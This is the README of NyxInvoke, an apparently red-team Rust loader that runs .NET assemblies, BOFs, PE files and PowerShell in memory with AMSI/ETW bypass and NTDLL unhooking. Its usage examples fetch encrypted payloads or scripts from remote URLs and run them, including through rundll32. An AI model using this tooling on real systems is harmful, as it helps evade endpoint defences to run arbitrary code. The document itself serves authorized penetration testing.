# NyxInvoke

NyxInvoke is a versatile Rust-based tool designed for executing .NET assemblies, PowerShell commands/scripts, Beacon Object Files (BOFs) and PE files with built-in Ntdll Unhooking, patchless AMSI and ETW bypass capabilities.  It can be compiled as either a standalone executable or a DLL.

## Features

- Execute .NET assemblies
- Run PowerShell commands or scripts
- Load and execute Beacon Object Files (BOFs)
- Load and execute PE Files (EXEs)
- Built-in patchless AMSI (Anti-Malware Scan Interface) bypass
- Built-in patchless ETW (Event Tracing for Windows) bypass
- Built-in NTDLL unhook without triggering the "PspCreateProcessNotifyRoutine" callback
- Support for encrypted payloads with AES decryption
- Flexible input options: local files, URLs, or compiled-in data
- Dual-build support: can be compiled as an executable or a DLL

## Building

NyxInvoke can be built as either an executable or a DLL. Use the following commands:

### Executable

```
cargo +nightly build --release --target=x86_64-pc-windows-msvc --features exe --bin NyxInvoke
```

### DLL

```
cargo +nightly build --release --target=x86_64-pc-windows-msvc --features dll --lib
```

To include compiled-in CLR, BOF or PE data, add the respective features:

```
cargo +nightly build --release --target=x86_64-pc-windows-msvc --features=exe,compiled_clr,compiled_bof,compiled_pe --bin NyxInvoke
```
or
```
cargo +nightly build --release --target=x86_64-pc-windows-msvc --features=dll,compiled_clr,compiled_bof,compiled_pe --lib
```

## Usage

### Executable Mode

The executable supports three main modes of operation:

1. CLR Mode (.NET assembly execution)
2. PowerShell Mode
3. BOF Mode (Beacon Object File execution)
4. PE Mode (PE File execution)

#### General Syntax

```
NyxInvoke.exe <mode> [OPTIONS]
```

Where `<mode>` is one of: `clr`, `ps`, `bof` or `pe`.

### DLL Mode

When compiled as a DLL, NyxInvoke can be executed using rundll32. The syntax is:

```
rundll32.exe NyxInvoke.dll,NyxInvoke <mode> [OPTIONS]
```

### Mode-Specific Options

1. CLR Mode:
```text
Execute Common Language Runtime (CLR) assemblies

Usage: NyxInvoke.exe clr [OPTIONS]

Options:
  -a, --args <ARGS>...            Arguments to pass to the assembly
  -b, --base <URL_OR_PATH>        Base URL or path for resources
  -k, --key <KEY_FILE>            Path to the encryption key file
  -i, --iv <IV_FILE>              Path to the initialization vector (IV) file
  -f, --assembly <ASSEMBLY_FILE>  Path or URL to the encrypted assembly file to execute
  -u, --unencrypted               Whether the assembly is unencrypted (default is encrypted)
  -h, --help                      Print help (see more with '--help')

Example: NyxInvoke.exe clr --assembly payload.enc --key key.bin --iv iv.bin --args "arg1 arg2"
```

2. BOF Mode:
```text
Execute Beacon Object Files (BOF)

Usage: NyxInvoke.exe bof [OPTIONS]

Options:
  -a, --args <ARGS>...      Arguments to pass to the BOF
  -b, --base <URL_OR_PATH>  Base URL or path for resources
  -k, --key <KEY_FILE>      Path to the encryption key file
  -i, --iv <IV_FILE>        Path to the initialization vector (IV) file
  -f, --bof <BOF_FILE>      Path or URL to the encrypted BOF file to execute
  -u, --unencrypted         Whether the BOF is unencrypted (default is encrypted)
  -h, --help                Print help (see more with '--help')

Example: NyxInvoke.exe bof --bof payload.enc --key key.bin --iv iv.bin --args "arg1 arg2"
```

3. PE Mode:
```text
Execute Portable Executable (PE) files

Usage: NyxInvoke.exe pe [OPTIONS]

Options:
  -a, --args <ARGS>...      Arguments to pass to the PE
  -b, --base <URL_OR_PATH>  Base URL or path for resources
  -k, --key <KEY_FILE>      Path to the encryption key file
  -i, --iv <IV_FILE>        Path to the initialization vector (IV) file
  -f, --pe <PE_FILE>        Path or URL to the encrypted PE file to execute
  -u, --unencrypted         Whether the PE is unencrypted (default is encrypted)
  -h, --help                Print help (see more with '--help')

Example: NyxInvoke.exe pe --pe payload.enc --key key.bin --iv iv.bin --args "arg1 arg2"
```

4. PowerShell Mode:
```text
Execute PowerShell commands or scripts

Usage: NyxInvoke.exe ps [OPTIONS]

Options:
  -c, --command <PS_COMMAND>  PowerShell command to execute
  -s, --script <PS_SCRIPT>    Path or URL to the PowerShell script to execute
  -h, --help                  Print help (see more with '--help')

Examples:
NyxInvoke.exe ps --command "Get-Process"
NyxInvoke.exe ps --script script.ps1
```

## Examples

### Executable Mode

1. CLR Mode (Remote Execution):
   ```
   NyxInvoke.exe clr --base https://example.com/resources --key clr_aes.key --iv clr_aes.iv --assembly clr_data.enc --args arg1 arg2
   ```

2. PowerShell Mode (Script Execution):
   ```
   NyxInvoke.exe ps --script C:\path\to\script.ps1
   ```

3. BOF Mode (Local Execution):
   ```
   NyxInvoke.exe bof --key C:\path\to\bof_aes.key --iv C:\path\to\bof_aes.iv --bof C:\path\to\bof_data.enc --args "str=argument1" "int=42"
   ```

3. PE Mode (Compiled Execution):
   ```
   NyxInvoke.exe pe --args arg1
   ```
### DLL Mode

1. CLR Mode (Remote Execution):
   ```
   rundll32.exe NyxInvoke.dll,NyxInvoke clr --base https://example.com/resources --key clr_aes.key --iv clr_aes.iv --assembly clr_data.enc --args arg1 arg2
   ```

2. PowerShell Mode (Direct Command Execution):
   ```
   rundll32.exe NyxInvoke.dll,NyxInvoke ps --command "Get-Process | Select-Object Name, ID"
   ```

3. BOF Mode (Compiled Execution):
   ```
   rundll32.exe NyxInvoke.dll,NyxInvoke bof --args "str=argument1" "int=42"
   ```

4. PE Mode (Local Execution Unencrypted):
   ```
   rundll32.exe NyxInvoke.dll,NyxInvoke pe -u --pe C:\path\to\pe.exe --args arg1 arg2
   ```

## Test Resources

In the `resources` directory, you'll find several files to test NyxInvoke's functionality:

1. Encrypted CLR Assembly (Seatbelt):
   - File: `clr_data.enc`
   - Description: An encrypted version of the Seatbelt tool, a C# project for gathering system information.
   - Usage example:
     ```
     NyxInvoke.exe clr --key resources/clr_aes.key --iv resources/clr_aes.iv --assembly resources/clr_data.enc --args AntiVirus
     ```

2. Encrypted BOF (Directory Listing):
   - File: `bof_data.enc`
   - Description: An encrypted Beacon Object File that List user permissions for the specified file, wildcards supported.
   - Usage example:
     ```
     NyxInvoke.exe bof --key resources/bof_aes.key --iv resources/bof_aes.iv --bof resources/bof_data.enc --args "wstr=C:\Windows\system32\cmd.exe"
     ```

3. Encrypted PE (Message Box):
   - File: `pe_data.enc`
   - Description: An encrypted PE File that pop up message box.
   - Usage example:
     ```
     NyxInvoke.exe pe
     ```
4. Powershell (Message Box):
   - File: `ps.ps1`
   - Description: An Powershell script that pop up message box.
   - Usage example:
     ```
     NyxInvoke.exe ps -s http://example.com/ps.ps1
     ```

## Screenshot


- Dll Compiled CLR Executaion 

![Screenshot 2024-09-18 123147](https://github.com/user-attachments/assets/dd58adbc-50f2-4eb4-9a33-0851bacfe754)


- EXE Remote BOF Executaion 

![Screenshot 2024-09-18 123410](https://github.com/user-attachments/assets/54a20996-7cf3-4cbb-ab4d-6e7973094e80)


- Dll Compiled EXE Executaion



- Dll Powershell Script Executaion 

![Screenshot 2024-09-18 123547](https://github.com/user-attachments/assets/6c1e2f53-0d85-45e8-8a38-4a6dcb08a767)



## Legal Notice

This tool is for educational and authorized testing purposes only. Ensure you have proper permissions before use in any environment.

## Credits

- @yamakadi for the [clroxide](https://github.com/yamakadi/clroxide) project
- @hakaioffsec for the [coffee](https://github.com/hakaioffsec/coffee) project
